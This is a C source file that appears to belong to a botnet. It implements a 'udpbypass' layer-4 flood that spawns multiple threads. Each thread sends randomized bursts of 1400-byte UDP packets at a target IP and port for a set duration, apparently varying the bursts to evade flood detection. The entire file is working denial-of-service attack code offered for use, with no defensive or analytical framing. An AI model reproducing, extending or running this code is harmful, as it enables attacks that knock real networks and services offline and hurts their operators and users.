#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

static void *fast_switch_worker(void *arg) {
    target_t *t = arg;
    XorShift64 *rng = rng_new();
    uint8_t databuf[1400];
    rng_fill(rng, databuf, 1400);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    inet_pton(AF_INET, t->ip, &sin.sin_addr);
    sin.sin_port = htons(t->port);
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { free(rng); return NULL; }
    int check = 1000;
    time_t end = time(NULL) + t->sec;
    while (running) {
        if (--check <= 0) { if (time(NULL) >= end) break; check = 1000; }
        int burst = 3 + (int)(rng_next(rng) % 8);
        for (int j = 0; j < burst; j++) {
            sendto(fd, databuf, 1400, 0, (struct sockaddr*)&sin, sizeof(sin));
        }
    }
    close(fd); free(rng);
    return NULL;
}

static void *burst_worker(void *arg) {
    target_t *t = arg;
    XorShift64 *rng = rng_new();
    uint8_t databuf[1400];
    rng_fill(rng, databuf, 1400);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    inet_pton(AF_INET, t->ip, &sin.sin_addr);
    sin.sin_port = htons(t->port);
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { free(rng); return NULL; }
    int check = 1000;
    time_t end = time(NULL) + t->sec;
    while (running) {
        if (--check <= 0) { if (time(NULL) >= end) break; check = 1000; }
        int burst = 8 + (int)(rng_next(rng) % 13);
        for (int j = 0; j < burst; j++) {
            sendto(fd, databuf, 1400, 0, (struct sockaddr*)&sin, sizeof(sin));
        }
    }
    close(fd); free(rng);
    return NULL;
}

void flood_udpbypass(const char *target, int port, int sec) {
    target_t t;
    if (resolve_target(&t, target) < 0) return;
    t.port = port;
    t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++) {
        void *(*fn)(void*);
        fn = (i % 2 == 0) ? fast_switch_worker : burst_worker;
        pthread_create(&threads[i], NULL, fn, &t);
    }
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
